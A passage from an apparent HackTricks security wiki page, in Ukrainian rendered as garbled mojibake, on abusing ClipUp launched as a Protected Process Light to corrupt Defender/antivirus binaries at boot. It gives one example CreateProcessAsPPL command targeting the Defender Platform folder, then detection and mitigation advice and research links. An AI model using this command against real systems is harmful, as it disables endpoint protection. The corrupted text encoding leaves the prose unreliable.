4) –ü—ñ—Å–ª—è –ø–µ—Ä–µ–∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –∑–∞–ø–∏—Å –∑ –ø—ñ–¥—Ç—Ä–∏–º–∫–æ—é PPL –≤—ñ–¥–±—É–≤–∞—î—Ç—å—Å—è –¥–æ —Ç–æ–≥–æ, —è–∫ AV –∑–∞–±–ª–æ–∫—É—î —Å–≤–æ—ó –±—ñ–Ω–∞—Ä–Ω–∏–∫–∏, —â–æ –ø—Ä–∏–∑–≤–æ–¥–∏—Ç—å –¥–æ –ø–æ—à–∫–æ–¥–∂–µ–Ω–Ω—è —Ü—ñ–ª—å–æ–≤–æ–≥–æ —Ñ–∞–π–ª—É —Ç–∞ –Ω–µ–º–æ–∂–ª–∏–≤–æ—Å—Ç—ñ –∑–∞–ø—É—Å–∫—É.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notes and constraints
- –í–∏ –Ω–µ –º–æ–∂–µ—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—é–≤–∞—Ç–∏ –≤–º—ñ—Å—Ç, —è–∫–∏–π ClipUp –∑–∞–ø–∏—Å—É—î, –æ–∫—Ä—ñ–º —Ä–æ–∑—Ç–∞—à—É–≤–∞–Ω–Ω—è; –ø—Ä–∏–º—ñ—Ç–∏–≤ –ø—ñ–¥—Ö–æ–¥–∏—Ç—å –±—ñ–ª—å—à–µ –¥–ª—è corruption, –∞ –Ω–µ –¥–ª—è —Ç–æ—á–Ω–æ–≥–æ –≤–ø—Ä–æ–≤–∞–¥–∂–µ–Ω–Ω—è –∫–æ–Ω—Ç–µ–Ω—Ç—É.
- –ü–æ—Ç—Ä–µ–±—É—î –ª–æ–∫–∞–ª—å–Ω–∏—Ö –ø—Ä–∞–≤ admin/SYSTEM –¥–ª—è –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è/–∑–∞–ø—É—Å–∫—É —Å–µ—Ä–≤—ñ—Å—É –π –≤—ñ–∫–Ω–∞ –¥–ª—è –ø–µ—Ä–µ–∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è.
- –ß–∞—Å—É–≤–∞–Ω–Ω—è –∫—Ä–∏—Ç–∏—á–Ω–µ: —Ü—ñ–ª—å –Ω–µ –º–∞—î –±—É—Ç–∏ –≤—ñ–¥–∫—Ä–∏—Ç–æ—é; –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –ø—ñ–¥ —á–∞—Å –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è —É–Ω–∏–∫–∞—î –±–ª–æ–∫—É–≤–∞–Ω—å —Ñ–∞–π–ª—ñ–≤.

Detections
- –°—Ç–≤–æ—Ä–µ–Ω–Ω—è –ø—Ä–æ—Ü–µ—Å—É `ClipUp.exe` –∑ –Ω–µ–∑–≤–∏—á–Ω–∏–º–∏ –∞—Ä–≥—É–º–µ–Ω—Ç–∞–º–∏, –æ—Å–æ–±–ª–∏–≤–æ —è–∫—â–æ –π–æ–≥–æ –ø–æ—Ä–æ–¥–∂—É—î –Ω–µ—Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω–∏–π –ª–æ—É–Ω—á–µ—Ä, –ø—ñ–¥ —á–∞—Å –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è.
- –ù–æ–≤—ñ —Å–µ—Ä–≤—ñ—Å–∏, –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω—ñ –Ω–∞ –∞–≤—Ç–æ–∑–∞–ø—É—Å–∫ –ø—ñ–¥–æ–∑—Ä—ñ–ª–∏—Ö –±—ñ–Ω–∞—Ä–Ω–∏–∫—ñ–≤ —ñ —â–æ —Å–∏—Å—Ç–µ–º–∞—Ç–∏—á–Ω–æ —Å—Ç–∞—Ä—Ç—É—é—Ç—å –¥–æ Defender/AV. –î–æ—Å–ª—ñ–¥–∂—É–π—Ç–µ —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è/–∑–º—ñ–Ω—É —Å–µ—Ä–≤—ñ—Å—ñ–≤ –ø–µ—Ä–µ–¥ –ø–æ–º–∏–ª–∫–∞–º–∏ –∑–∞–ø—É—Å–∫—É Defender.
- –ú–æ–Ω—ñ—Ç–æ—Ä–∏–Ω–≥ —Ü—ñ–ª—ñ—Å–Ω–æ—Å—Ç—ñ —Ñ–∞–π–ª—ñ–≤ —É –¥–∏—Ä–µ–∫—Ç–æ—Ä—ñ—è—Ö –±—ñ–Ω–∞—Ä–Ω–∏–∫—ñ–≤/Platform Defender; –Ω–µ—Å–ø–æ–¥—ñ–≤–∞–Ω—ñ —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è/–∑–º—ñ–Ω–∏ —Ñ–∞–π–ª—ñ–≤ –ø—Ä–æ—Ü–µ—Å–∞–º–∏ –∑ –ø—Ä–∞–ø–æ—Ä–∞–º–∏ protected-process.
- ETW/EDR —Ç–µ–ª–µ–º–µ—Ç—Ä—ñ—è: —à—É–∫–∞–π—Ç–µ –ø—Ä–æ—Ü–µ—Å–∏, —Å—Ç–≤–æ—Ä–µ–Ω—ñ –∑ `CREATE_PROTECTED_PROCESS`, —Ç–∞ –∞–Ω–æ–º–∞–ª—å–Ω–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è —Ä—ñ–≤–Ω—ñ–≤ PPL –Ω–µ-AV –±—ñ–Ω–∞—Ä–Ω–∏–∫–∞–º–∏.

Mitigations
- WDAC/Code Integrity: –æ–±–º–µ–∂—Ç–µ, —è–∫—ñ –ø—ñ–¥–ø–∏—Å–∞–Ω—ñ –±—ñ–Ω–∞—Ä–Ω–∏–∫–∏ –º–æ–∂—É—Ç—å –∑–∞–ø—É—Å–∫–∞—Ç–∏—Å—è —è–∫ PPL —ñ –ø—ñ–¥ —è–∫–∏–º–∏ –±–∞—Ç—å–∫–∞–º–∏; –±–ª–æ–∫—É–≤–∞—Ç–∏ –≤–∏–∫–ª–∏–∫ ClipUp –ø–æ–∑–∞ –ª–µ–≥—ñ—Ç–∏–º–Ω–∏–º–∏ –∫–æ–Ω—Ç–µ–∫—Å—Ç–∞–º–∏.
- –ì—ñ–≥—ñ—î–Ω–∞ —Å–µ—Ä–≤—ñ—Å—ñ–≤: –æ–±–º–µ–∂—Ç–µ —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è/–∑–º—ñ–Ω—É —Å–µ—Ä–≤—ñ—Å—ñ–≤ –∑ –∞–≤—Ç–æ–∑–∞–ø—É—Å–∫–æ–º —Ç–∞ –º–æ–Ω—ñ—Ç–æ—Ä—å—Ç–µ –º–∞–Ω—ñ–ø—É–ª—è—Ü—ñ—ó –ø–æ—Ä—è–¥–∫–æ–º –∑–∞–ø—É—Å–∫—É.
- –ü–µ—Ä–µ–∫–æ–Ω–∞–π—Ç–µ—Å—å, —â–æ Defender tamper protection —Ç–∞ early-launch –∑–∞—Ö–∏—Å—Ç–∏ —É–≤—ñ–º–∫–Ω–µ–Ω—ñ; –¥–æ—Å–ª—ñ–¥–∂—É–π—Ç–µ –ø–æ–º–∏–ª–∫–∏ –∑–∞–ø—É—Å–∫—É, —â–æ –≤–∫–∞–∑—É—é—Ç—å –Ω–∞ –∫–æ—Ä—É–ø—Ü—ñ—é –±—ñ–Ω–∞—Ä–Ω–∏–∫—ñ–≤.
- –†–æ–∑–≥–ª—è–Ω—å—Ç–µ –≤—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è –≥–µ–Ω–µ—Ä–∞—Ü—ñ—ó –∫–æ—Ä–æ—Ç–∫–∏—Ö —ñ–º–µ–Ω 8.3 –Ω–∞ —Ç–æ–º–∞—Ö, —â–æ –º—ñ—Å—Ç—è—Ç—å —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏ –±–µ–∑–ø–µ–∫–∏, —è–∫—â–æ —Ü–µ —Å—É–º—ñ—Å–Ω–æ –∑ –≤–∞—à–∏–º —Å–µ—Ä–µ–¥–æ–≤–∏—â–µ–º (—Ä–µ—Ç–µ–ª—å–Ω–æ –ø—Ä–æ—Ç–µ—Å—Ç—É–π—Ç–µ).

References for PPL and tooling
- –û–≥–ª—è–¥ Microsoft Protected Processes: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- –î–æ–≤—ñ–¥–Ω–∏–∫ EKU: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (–ø–µ—Ä–µ–≤—ñ—Ä–∫–∞ –ø–æ—Ä—è–¥–∫—É): https://learn.microsoft.com/sysinternals/downloads/procmon
- –õ–∞—É–Ω—á–µ—Ä CreateProcessAsPPL: https://github.com/2x7EQ13/CreateProcessAsPPL
- –û–ø–∏—Å —Ç–µ—Ö–Ω—ñ–∫–∏ (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## References

- [Unit42 ‚Äì New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv ‚Äì Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research ‚Äì Before ToolShell: Exploring Storm-2603‚Äôs Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn ‚Äì DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs ‚Äì Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft ‚Äì Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft ‚Äì EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals ‚Äì Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium ‚Äì Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)

- [Check Point Research ‚Äì Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)

{{#include ../banners/hacktricks-training.md}}
